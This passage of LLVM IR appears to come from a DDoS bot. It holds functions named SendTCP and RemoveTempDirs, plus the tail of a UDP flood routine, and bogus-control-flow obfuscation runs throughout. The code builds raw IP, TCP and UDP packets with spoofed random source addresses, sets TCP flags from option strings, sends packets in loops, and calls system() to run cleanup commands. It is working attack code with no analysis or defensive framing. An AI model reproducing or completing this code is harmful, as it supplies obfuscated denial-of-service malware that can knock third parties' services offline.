  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %313, label %322, label %361

; <label>:322:                                    ; preds = %originalBBpart231
  %323 = call i64 @time(i64* null) #5
  %324 = load i32, i32* %30, align 4
  %325 = sext i32 %324 to i64
  %326 = icmp sgt i64 %323, %325
  br i1 %326, label %327, label %344

; <label>:327:                                    ; preds = %322
  %328 = load i32, i32* @x.75
  %329 = load i32, i32* @y.76
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %327
  %336 = load i32, i32* @x.75
  %337 = load i32, i32* @y.76
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %364

; <label>:344:                                    ; preds = %322
  %345 = load i32, i32* @x.75
  %346 = load i32, i32* @y.76
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %344
  store i32 0, i32* %31, align 4
  %353 = load i32, i32* @x.75
  %354 = load i32, i32* @y.76
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %227

; <label>:361:                                    ; preds = %originalBBpart231
  %362 = load i32, i32* %31, align 4
  %363 = add i32 %362, 1
  store i32 %363, i32* %31, align 4
  br label %227

; <label>:364:                                    ; preds = %originalBBpart235
  %365 = load i8*, i8** %27, align 8
  call void @llvm.stackrestore(i8* %365)
  br label %366

; <label>:366:                                    ; preds = %364, %119, %originalBBpart212, %originalBBpart28
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %367 = alloca i8*, align 8
  %368 = alloca i32, align 4
  %369 = alloca i32, align 4
  %370 = alloca i32, align 4
  %371 = alloca i32, align 4
  %372 = alloca i32, align 4
  %373 = alloca %struct.sockaddr_in, align 4
  %374 = alloca i32, align 4
  %375 = alloca i32, align 4
  %376 = alloca i32, align 4
  %377 = alloca i32, align 4
  %378 = alloca i32, align 4
  %379 = alloca i8*, align 8
  %380 = alloca %struct.iphdr*, align 8
  %381 = alloca %struct.udphdr*, align 8
  %382 = alloca i32, align 4
  %383 = alloca i32, align 4
  store i8* %0, i8** %367, align 8
  store i32 %1, i32* %368, align 4
  store i32 %2, i32* %369, align 4
  store i32 %3, i32* %370, align 4
  store i32 %4, i32* %371, align 4
  store i32 %5, i32* %372, align 4
  %384 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %373, i32 0, i32 0
  store i16 2, i16* %384, align 4
  %385 = load i32, i32* %368, align 4
  %386 = icmp eq i32 %385, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %387 = load i32, i32* %16, align 4
  %388 = trunc i32 %387 to i16
  %389 = call zeroext i16 @htons(i16 zeroext %388) #10
  %390 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %389, i16* %390, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %97
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  %391 = call i64 @time(i64* null) #5
  %392 = call i32 @rand_cmwc()
  %393 = zext i32 %392 to i64
  %_ = sub i64 %391, %393
  %gen = mul i64 %_, %393
  %_15 = shl i64 %391, %393
  %_16 = shl i64 %391, %393
  %394 = xor i64 %391, %393
  %395 = trunc i64 %394 to i32
  call void @srand(i32 %395) #5
  %396 = call i32 @rand() #5
  call void @init_rand(i32 %396)
  br label %originalBB14

originalBB20alteredBB:                            ; preds = %originalBB20, %228
  %397 = load i32, i32* %23, align 4
  %398 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %399 = call i64 @sendto(i32 %397, i8* %158, i64 %156, i32 0, %struct.sockaddr* %398, i32 16)
  %400 = call i32 @rand_cmwc()
  %401 = trunc i32 %400 to i16
  %402 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 0
  %404 = bitcast %union.anon.1* %403 to %struct.anon.2*
  %405 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %404, i32 0, i32 0
  store i16 %401, i16* %405, align 2
  %406 = load i32, i32* %16, align 4
  %407 = icmp eq i32 %406, 0
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %258
  %408 = load i32, i32* %16, align 4
  %409 = trunc i32 %408 to i16
  %410 = call zeroext i16 @htons(i16 zeroext %409) #10
  %411 = zext i16 %410 to i32
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %279
  %412 = trunc i32 %280 to i16
  %413 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %414 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %413, i32 0, i32 0
  %415 = bitcast %union.anon.1* %414 to %struct.anon.2*
  %416 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %415, i32 0, i32 1
  store i16 %412, i16* %416, align 2
  %417 = call i32 @rand_cmwc()
  %418 = trunc i32 %417 to i16
  %419 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 3
  store i16 %418, i16* %420, align 4
  %421 = load i32, i32* %26, align 4
  %422 = call i32 @getRandomIP(i32 %421)
  %423 = call i32 @htonl(i32 %422) #10
  %424 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 8
  store i32 %423, i32* %425, align 4
  %426 = bitcast i8* %158 to i16*
  %427 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 2
  %429 = load i16, i16* %428, align 2
  %430 = zext i16 %429 to i32
  %431 = call zeroext i16 @csum(i16* %426, i32 %430)
  %432 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 7
  store i16 %431, i16* %433, align 2
  %434 = load i32, i32* %31, align 4
  %435 = load i32, i32* %22, align 4
  %436 = icmp eq i32 %434, %435
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %327
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %344
  store i32 0, i32* %31, align 4
  br label %originalBB37
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.291, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.292, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.293, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.294, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.295, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.79
  %46 = load i32, i32* @y.80
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.79
  %54 = load i32, i32* @y.80
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %575

; <label>:61:                                     ; preds = %39
  %62 = load i32, i32* @x.79
  %63 = load i32, i32* @y.80
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %71 = getelementptr inbounds [8 x i8], [8 x i8]* %70, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 8, i32 4, i1 false)
  %72 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %72, i32* %17, align 4
  %73 = load i32, i32* %17, align 4
  %74 = icmp ne i32 %73, 0
  %75 = load i32, i32* @x.79
  %76 = load i32, i32* @y.80
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %84, label %83

; <label>:83:                                     ; preds = %originalBBpart24
  br label %575

; <label>:84:                                     ; preds = %originalBBpart24
  %85 = load i32, i32* @x.79
  %86 = load i32, i32* @y.80
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  store i32 1, i32* %18, align 4
  %93 = load i32, i32* %17, align 4
  %94 = bitcast i32* %18 to i8*
  %95 = call i32 @setsockopt(i32 %93, i32 0, i32 3, i8* %94, i32 4) #5
  %96 = icmp slt i32 %95, 0
  %97 = load i32, i32* @x.79
  %98 = load i32, i32* @y.80
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %96, label %105, label %106

; <label>:105:                                    ; preds = %originalBBpart28
  br label %575

; <label>:106:                                    ; preds = %originalBBpart28
  %107 = load i32, i32* @x.79
  %108 = load i32, i32* @y.80
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %106
  %115 = load i32, i32* %14, align 4
  %116 = icmp eq i32 %115, 0
  %117 = load i32, i32* @x.79
  %118 = load i32, i32* @y.80
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %116, label %125, label %126

; <label>:125:                                    ; preds = %originalBBpart212
  store i32 0, i32* %19, align 4
  br label %132

; <label>:126:                                    ; preds = %originalBBpart212
  %127 = load i32, i32* %14, align 4
  %128 = sub nsw i32 32, %127
  %129 = shl i32 1, %128
  %130 = sub nsw i32 %129, 1
  %131 = xor i32 %130, -1
  store i32 %131, i32* %19, align 4
  br label %132

; <label>:132:                                    ; preds = %126, %125
  %133 = load i32, i32* @x.79
  %134 = load i32, i32* @y.80
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %132
  %141 = load i32, i32* %12, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 40, %142
  %144 = call i8* @llvm.stacksave()
  store i8* %144, i8** %20, align 8
  %145 = alloca i8, i64 %143, align 16
  %146 = bitcast i8* %145 to %struct.iphdr*
  store %struct.iphdr* %146, %struct.iphdr** %21, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = getelementptr i8, i8* %148, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  store %struct.tcphdr* %150, %struct.tcphdr** %22, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = load i32, i32* %19, align 4
  %156 = call i32 @getRandomIP(i32 %155)
  %157 = call i32 @htonl(i32 %156) #10
  %158 = load i32, i32* %12, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 20, %159
  %161 = trunc i64 %160 to i32
  call void @makeIPPacket(%struct.iphdr* %151, i32 %154, i32 %157, i8 zeroext 6, i32 %161)
  %162 = call i32 @rand_cmwc()
  %163 = trunc i32 %162 to i16
  %164 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon* %165 to %struct.anon.0*
  %167 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %166, i32 0, i32 0
  store i16 %163, i16* %167, align 4
  %168 = call i32 @rand_cmwc()
  %169 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  %171 = bitcast %union.anon* %170 to %struct.anon.0*
  %172 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %171, i32 0, i32 2
  store i32 %168, i32* %172, align 4
  %173 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %174 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon* %174 to %struct.anon.0*
  %176 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %175, i32 0, i32 3
  store i32 0, i32* %176, align 4
  %177 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %178 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %177, i32 0, i32 0
  %179 = bitcast %union.anon* %178 to %struct.anon.0*
  %180 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %179, i32 0, i32 4
  %181 = load i16, i16* %180, align 4
  %182 = and i16 %181, -241
  %183 = or i16 %182, 80
  store i16 %183, i16* %180, align 4
  %184 = load i8*, i8** %11, align 8
  %185 = call i32 @strcmp(i8* %184, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.296, i32 0, i32 0)) #9
  %186 = icmp ne i32 %185, 0
  %187 = load i32, i32* @x.79
  %188 = load i32, i32* @y.80
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart239, label %originalBB14alteredBB

originalBBpart239:                                ; preds = %originalBB14
  br i1 %186, label %247, label %195

; <label>:195:                                    ; preds = %originalBBpart239
  %196 = load i32, i32* @x.79
  %197 = load i32, i32* @y.80
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %195
  %204 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon* %205 to %struct.anon.0*
  %207 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -513
  %210 = or i16 %209, 512
  store i16 %210, i16* %207, align 4
  %211 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 0
  %213 = bitcast %union.anon* %212 to %struct.anon.0*
  %214 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %215, -1025
  %217 = or i16 %216, 1024
  store i16 %217, i16* %214, align 4
  %218 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon* %219 to %struct.anon.0*
  %221 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %222, -257
  %224 = or i16 %223, 256
  store i16 %224, i16* %221, align 4
  %225 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 0
  %227 = bitcast %union.anon* %226 to %struct.anon.0*
  %228 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %229, -4097
  %231 = or i16 %230, 4096
  store i16 %231, i16* %228, align 4
  %232 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon* %233 to %struct.anon.0*
  %235 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %236, -2049
  %238 = or i16 %237, 2048
  store i16 %238, i16* %235, align 4
  %239 = load i32, i32* @x.79
  %240 = load i32, i32* @y.80
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart2121, label %originalBB41alteredBB

originalBBpart2121:                               ; preds = %originalBB41
  br label %401

; <label>:247:                                    ; preds = %originalBBpart239
  %248 = load i8*, i8** %11, align 8
  %249 = call i8* @strtok(i8* %248, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %249, i8** %23, align 8
  br label %250

; <label>:250:                                    ; preds = %398, %247
  %251 = load i32, i32* @x.79
  %252 = load i32, i32* @y.80
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %250
  %259 = load i8*, i8** %23, align 8
  %260 = icmp ne i8* %259, null
  %261 = load i32, i32* @x.79
  %262 = load i32, i32* @y.80
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart2125, label %originalBB123alteredBB

originalBBpart2125:                               ; preds = %originalBB123
  br i1 %260, label %269, label %400

; <label>:269:                                    ; preds = %originalBBpart2125
  %270 = load i8*, i8** %23, align 8
  %271 = call i32 @strcmp(i8* %270, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.298, i32 0, i32 0)) #9
  %272 = icmp ne i32 %271, 0
  br i1 %272, label %281, label %273

; <label>:273:                                    ; preds = %269
  %274 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 0
  %276 = bitcast %union.anon* %275 to %struct.anon.0*
  %277 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %276, i32 0, i32 4
  %278 = load i16, i16* %277, align 4
  %279 = and i16 %278, -513
  %280 = or i16 %279, 512
  store i16 %280, i16* %277, align 4
  br label %398

; <label>:281:                                    ; preds = %269
  %282 = load i8*, i8** %23, align 8
  %283 = call i32 @strcmp(i8* %282, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.299, i32 0, i32 0)) #9
  %284 = icmp ne i32 %283, 0
  br i1 %284, label %293, label %285

; <label>:285:                                    ; preds = %281
  %286 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 0
  %288 = bitcast %union.anon* %287 to %struct.anon.0*
  %289 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %288, i32 0, i32 4
  %290 = load i16, i16* %289, align 4
  %291 = and i16 %290, -1025
  %292 = or i16 %291, 1024
  store i16 %292, i16* %289, align 4
  br label %381

; <label>:293:                                    ; preds = %281
  %294 = load i32, i32* @x.79
  %295 = load i32, i32* @y.80
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB127, label %originalBB127alteredBB

originalBB127:                                    ; preds = %originalBB127alteredBB, %293
  %302 = load i8*, i8** %23, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.300, i32 0, i32 0)) #9
  %304 = icmp ne i32 %303, 0
  %305 = load i32, i32* @x.79
  %306 = load i32, i32* @y.80
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart2129, label %originalBB127alteredBB

originalBBpart2129:                               ; preds = %originalBB127
  br i1 %304, label %321, label %313

; <label>:313:                                    ; preds = %originalBBpart2129
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon* %315 to %struct.anon.0*
  %317 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = and i16 %318, -257
  %320 = or i16 %319, 256
  store i16 %320, i16* %317, align 4
  br label %380

; <label>:321:                                    ; preds = %originalBBpart2129
  %322 = load i32, i32* @x.79
  %323 = load i32, i32* @y.80
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB131, label %originalBB131alteredBB

originalBB131:                                    ; preds = %originalBB131alteredBB, %321
  %330 = load i8*, i8** %23, align 8
  %331 = call i32 @strcmp(i8* %330, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.301, i32 0, i32 0)) #9
  %332 = icmp ne i32 %331, 0
  %333 = load i32, i32* @x.79
  %334 = load i32, i32* @y.80
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart2133, label %originalBB131alteredBB

originalBBpart2133:                               ; preds = %originalBB131
  br i1 %332, label %349, label %341

; <label>:341:                                    ; preds = %originalBBpart2133
  %342 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %343 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %342, i32 0, i32 0
  %344 = bitcast %union.anon* %343 to %struct.anon.0*
  %345 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %344, i32 0, i32 4
  %346 = load i16, i16* %345, align 4
  %347 = and i16 %346, -4097
  %348 = or i16 %347, 4096
  store i16 %348, i16* %345, align 4
  br label %379

; <label>:349:                                    ; preds = %originalBBpart2133
  %350 = load i32, i32* @x.79
  %351 = load i32, i32* @y.80
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %349
  %358 = load i8*, i8** %23, align 8
  %359 = call i32 @strcmp(i8* %358, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.302, i32 0, i32 0)) #9
  %360 = icmp ne i32 %359, 0
  %361 = load i32, i32* @x.79
  %362 = load i32, i32* @y.80
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart2137, label %originalBB135alteredBB

originalBBpart2137:                               ; preds = %originalBB135
  br i1 %360, label %377, label %369

; <label>:369:                                    ; preds = %originalBBpart2137
  %370 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 0
  %372 = bitcast %union.anon* %371 to %struct.anon.0*
  %373 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %372, i32 0, i32 4
  %374 = load i16, i16* %373, align 4
  %375 = and i16 %374, -2049
  %376 = or i16 %375, 2048
  store i16 %376, i16* %373, align 4
  br label %378

; <label>:377:                                    ; preds = %originalBBpart2137
  br label %378

; <label>:378:                                    ; preds = %377, %369
  br label %379

; <label>:379:                                    ; preds = %378, %341
  br label %380

; <label>:380:                                    ; preds = %379, %313
  br label %381

; <label>:381:                                    ; preds = %380, %285
